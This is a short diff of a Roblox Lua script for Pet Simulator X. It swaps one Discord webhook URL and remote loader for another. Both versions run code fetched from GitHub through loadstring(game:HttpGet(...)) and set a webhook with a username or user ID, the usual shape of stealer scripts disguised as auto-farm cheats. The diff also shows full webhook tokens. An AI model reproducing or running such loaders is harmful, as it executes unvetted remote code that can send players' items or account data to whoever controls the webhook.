@@ -1,4 +1,3 @@
-UserName = "gqgqgwwg123"
-WebHook = "https://discord.com/api/webhooks/1051872153936613427/6mOe-C5SliH1AUEnLkbcUJM3wZWfLcBsQeSMsyXybZw-NySfP6U-a9DQZDcaFyi5zUgm"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+_G.UserID = 546225585
+_G.WebHook = "https://discord.com/api/webhooks/1059171123373281392/O8rEek61FVdmaT7A1Yc4BgV7y6p4MxCLqGFo-xunhhv3g_rXEQNFWfblQTuPd_LaPh7z"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
